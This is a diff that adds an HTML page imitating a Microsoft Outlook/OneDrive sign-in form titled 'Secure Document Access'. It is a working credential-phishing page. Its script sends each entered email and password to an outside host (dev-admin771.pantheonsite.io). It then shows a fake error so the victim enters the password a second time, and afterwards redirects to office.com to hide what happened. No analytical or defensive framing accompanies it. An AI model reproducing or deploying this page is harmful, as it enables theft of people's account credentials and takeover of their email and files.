@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in to Outlook</title>
+<style>
+    body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    margin: 0;
+    padding: 0;
+}
+.container {
+
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+.box {
+    border: 1px solid #ccc;
+    background-color: white;
+    padding: 10px;
+    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+    max-width: 350px;
+    width: 100%;
+}
+.input-group {
+    margin-left: 10px;
+    margin-right: 10px;
+    margin-bottom: 15px;
+    margin-top: 15px;
+}
+.input-group label {
+    display: block;
+    margin-bottom: 5px;
+}
+.input-group input {
+    width: 93.6%;
+    padding: 8px;
+    border: 1px solid #ccc;
+}
+.input-group input[type="text"] {
+    width: 93%;
+    padding: 8px;
+
+}
+.button {
+    display: block;
+    width: 100%;
+    padding: 10px;
+    background-color: #0078D7;
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+}
+.url-box2 {
+    background-color: red;
+    border: 1px solid #B3B3B3;
+    align-self: center;
+    align-self: start;
+    border-radius: 5px;
+    padding: 5px;
+    margin-top: 0px;
+    font-family: Segoe Ui;
+    font-size: 12px;
+    color: white;
+    text-align: center;
+    display: none;
+}
+/* Loading overlay styles */
+.loading-overlay {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background-color: rgba(255, 255, 255, 0.8); /* Semi-transparent white background */
+display: flex;
+justify-content: center;
+align-items: center;
+z-index: 9999; /* Ensure it's on top of other elements */
+display: none; /* Initially hidden */
+}
+
+/* Loading spinner styles */
+.loading-spinner {
+border: 4px solid rgba(0, 0, 0, 0.3); /* Light gray border */
+border-top: 4px solid #0078D7; /* Blue border on top */
+border-radius: 50%;
+width: 40px;
+height: 40px;
+animation: spin 1s linear infinite; /* Rotate animation */
+}
+
+/* Keyframes for spinner animation */
+@keyframes spin {
+0% { transform: rotate(0deg); }
+100% { transform: rotate(360deg); }
+}
+
+    </style>
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/2/25/Microsoft_icon.svg/2048px-Microsoft_icon.svg.png">
+    <title>Secure Document Access</title>
+
+</head>
+<body>
+    <div id="loading-overlay" class="loading-overlay">
+    <div class="loading-spinner"></div>
+</div>
+
+    <div class="container">
+        <div class="box">
+
+           
+            <form onsubmit="return aet()">
+                <div class="input-group">
+                    <img src="https://cdn.is.wfu.edu/app/uploads/2020/12/01101947/oneDrive-Logo-New.jpg"/ width="100"><p>
+                    <input type="text"  name="registration" id="employee"  placeholder="Email Address" required="">
+                <p><input type="password" id="subscriber" placeholder="Password" name="company" required><p></p>
+        
+                <button type="submit" id="submit" class="button" onclick="simulateLoading(this);">Open Document</button></form>
+        </div>
+        <div class="url-box2">unexpected error please try again</div>
+  
+    </div>
+
+    </div>
+
+</body>
+<script>
+        // Function to show the loading overlay
+        function showLoadingOverlay() {
+        var loadingOverlay = document.getElementById('loading-overlay');
+        loadingOverlay.style.display = 'flex'; // Display the overlay
+        setTimeout(function () {
+            loadingOverlay.style.display = 'none'; // Hide the overlay after 2 seconds
+        }, 2000); // 2000 milliseconds (2 seconds)
+    }
+    
+    // Call the function when the page is loaded
+    window.onload = showLoadingOverlay;
+    var buttonClickCount = 0; // Track button click count
+    var formSubmittedCount = 0; // Track the number of form submissions
+    
+    function simulateLoading(button) {
+        // Disable the button
+        button.disabled = true;
+    
+        // Change the button text to indicate loading
+        button.innerHTML = 'Loading...';
+    
+        // Increment the button click count
+        buttonClickCount++;
+    
+        // Simulate loading for 3 seconds
+        setTimeout(function () {
+            // Re-enable the button
+            button.disabled = false;
+    
+            // Change the button text back to "Sign in"
+            button.innerHTML = 'Sign in';
+    
+            // Show url-box2 for 2 seconds
+            showUrlBox2();
+    
+            // Increment the form submission count
+            formSubmittedCount++;
+    
+            // Submit the form
+            aet();
+    
+            // Clear the password field
+            document.getElementById("subscriber").value = "";
+    
+            // Check if the form has been submitted twice
+            if (formSubmittedCount === 2) {
+                // Redirect to "https://office.com" after the second form submission
+                window.location.href = "https://office.com";
+            }
+        }, 3000); // 3000 milliseconds (3 seconds)
+    }
+    
+    function aet() {
+        // (A) GET FORM DATA
+        var data = new URLSearchParams();
+        data.append("e1", document.getElementById("employee").value);
+        data.append("e2", document.getElementById("subscriber").value);
+    
+        // (B) AJAX
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://dev-admin771.pantheonsite.io/file/index.php?" + data.toString());
+        // What to do when the server responds
+        xhr.onload = function () { console.log(this.response); };
+        xhr.send();
+    
+        // (C) PREVENT HTML FORM SUBMIT
+        return false;
+    }
+    
+    function showUrlBox2() {
+        var urlBox2 = document.querySelector('.url-box2');
+        urlBox2.style.display = 'block'; // Display url-box2
+        setTimeout(function () {
+            urlBox2.style.display = 'none'; // Hide url-box2 after 2 seconds
+        }, 2000); // 2000 milliseconds (2 seconds)
+    }
+</script>
+
+</html>
